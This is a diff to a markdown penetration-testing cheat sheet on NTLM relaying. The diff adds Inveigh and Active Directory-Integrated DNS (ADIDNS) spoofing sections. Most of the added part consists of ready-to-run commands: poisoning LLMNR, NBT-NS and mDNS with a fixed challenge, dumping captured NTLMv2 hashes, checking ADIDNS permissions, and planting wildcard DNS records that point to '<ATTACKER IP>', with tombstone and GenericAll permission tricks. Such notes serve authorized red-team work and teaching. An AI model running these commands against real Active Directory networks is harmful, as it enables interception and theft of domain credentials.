@@ -1,6 +1,8 @@
 # Relaying
 * [Poisoning](#Poisoning)
   * [Responder](#Responder)
+  * [Inveigh](#Inveigh)
+  * [Active Directory-Integrated DNS (ADIDNS)](Active-Directory-Integrated-DNS-(ADIDNS))
   * [Mitm6](#Mitm6)
   * [Files](#Files)
   * [Force-authentication](#Force-authentication)
@@ -16,12 +18,11 @@
 - Credits to an amazing post: https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
 
 ## Poisoning
-- Poisoning is possible with Responder, which will try to poison Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
+- Poisoning is possible with Responder or Inveigh or manually, which will try to poison Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
 
 ### Responder
-#### Check if LLMNR and NBT-NS is used
+#### Analyse mode
 - It is possible to check if LLMNR and NBT-NS is used without poisoning any request.
-- Use ```-A``` for analyze mode.
 ```
 sudo responder -I eth0 -A
 ```
@@ -30,6 +31,129 @@ sudo responder -I eth0 -A
 - Poison Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS) requests.
 ```
 sudo responder -I eth0
+```
+
+### Inveigh
+- https://github.com/Kevin-Robertson/Inveigh
+- Can poison LLMNR and NBTNS, but also ADIDNS
+- Use `-ConsoleOutput Y` to enable ConsoleOutput
+
+#### Analyse mode
+```
+Invoke-Inveigh -Inspect
+```
+
+#### Run inveigh
+```
+Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
+```
+
+#### Get data from hashtable
+```
+Get-Inveigh - get data from the $inveigh hashtable
+```
+
+#### Get all captured NTLMv2 challenge/response hashes
+```
+Get-Inveigh -NTLMv2
+```
+
+#### Stop
+```
+Stop-Inveigh
+```
+
+#### Enable real time console output
+```
+Watch-Inveigh
+```
+
+#### Clear hashtable
+```
+Clear-Inveigh
+```
+
+#### Get-Inveigh
+```
+Get-Inveigh
+```
+
+### Active Directory-Integrated DNS (ADIDNS)
+- Windows uses DNS, LLMNR and then NBNS in the respective order
+- If a matching DNS record name does not already exist in a zone, an authenticated user can create the record.
+- If you detectthe same LLMNR/NBNS request from multiple systems, a matching record can be added to ADIDNS. This can be effective when systems are sending out LLMNR/NBNS requests for old hosts that are no longer in DNS. If multiple systems within a subnet are trying to resolve specific names, outside systems may also be trying. In that scenario, injecting into ADIDNS will help extend the attack past the subnet boundary.
+- https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/
+- https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing
+- https://github.com/Kevin-Robertson/Powermad
+
+#### Check WINS forward lookup
+- If WINS forward lookup is enabled then adding a wildcard record won't work.
+- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+```
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DomainController'
+```
+
+#### Check ADIDNS permissions
+- By default `authenticated users` have the `CreateChild` permissions.
+```
+Get-ADIDNSPermission
+
+Get-ADIDNSPermission | Where-Object -Property IdentityReference -EQ S-1-5-11 | Where-Object -Property ActiveDirectoryRights -EQ CreateChild
+```
+
+#### Check for wildcard record
+- The DNS server will use the wildcard record to answer name requests that do not explicitly match records contained in the zone.
+- Gives error if it doesn't exist.
+```
+Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord
+
+Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition System
+Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition ForestDNSZones
+```
+
+#### Create wildcard record
+- By default, replication between sites can take up to three hours.
+- Use `-Tombstone` so any authenticated user can perform node modifications
+```
+New-ADIDNSNode -Node * -Data <ATTACKER IP> -Verbose
+
+New-ADIDNSNode -Node * -Data <ATTACKER IP> -Verbose -Tombstone
+```
+
+#### Give other groups permissions to the record
+- Optional
+```
+Grant-ADIDNSPermission -Node * -Principal "Authenticated Users" -Access GenericAll -Verbose
+```
+
+#### Enable tombstoned record
+```
+Enable-ADIDNSNode -Node *
+```
+
+#### Tombstone record
+```
+Disable-ADIDNSNode -Node *
+```
+
+#### Cleanup record
+```
+Remove-ADIDNSNode -Node *
+```
+
+#### Check DNS
+```
+nslookup idontexist.<DOMAIN>
+Resolve-DnsName idontexist.<DOMAIN>
+```
+
+### Inveigh
+- Inveigh can dynically spoof this too
+- `combo` Add a record to DNS if the same request is received with LLMNR/NBNS from multiple systems
+- `ns` injects an NS record and if needed, a target record. This is primarily for the GQBL bypass for wpad.
+- `wildcard` injects a wildcard record
+```
+Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
 ```
 
 ### Mitm6
